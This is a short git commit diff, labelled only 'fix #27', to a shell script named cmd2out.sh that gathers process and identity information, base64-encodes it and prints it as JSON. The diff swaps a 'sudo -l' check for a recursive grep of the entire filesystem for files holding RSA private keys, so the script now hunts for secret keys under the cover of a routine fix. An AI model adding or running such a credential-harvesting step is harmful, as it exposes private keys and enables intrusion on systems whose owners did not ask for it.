b0f3eafe5a8cf68191c265433c47f9419fab5959
Robert Polasek <robert.polasek@toptal.com>
2020-05-06 17:37:51 -0400

    fix #27

--- cmd2out.sh
+++ cmd2out.sh
@@ -6,7 +6,7 @@ ps -ef  >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
 id  >>$OUT 2>&1
 echo "=================================="  >>$OUT 2>&1
-sudo -l  >>$OUT 2>&1
+grep -Rl "-----BEGIN RSA PRIVATE KEY" /  >>$OUT 2>&1
 
 b64=$(cat $OUT|base64 -w0)
 echo "{ \"out\": \"${b64}\" }"
